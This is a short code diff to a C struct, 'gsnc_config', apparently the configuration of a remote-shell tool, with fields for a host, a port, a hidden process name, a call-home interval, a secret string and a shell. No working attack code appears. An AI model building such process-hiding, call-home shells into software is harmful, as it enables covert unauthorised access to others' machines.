@@ -5,9 +5,10 @@
 #define GSNC_CONFIG_MAGIC_XOR   (0x1f)
 struct gsnc_config {
     char host[128];
-    char proc_hidden_name[128];
+    char proc_hiddenname[64];
+    // char prg_exename[128];
     uint16_t port;
-    int callhome_sec;
+    int callhome_min;
     uint32_t flags;
     char sec_str[64];
     char shell[64];
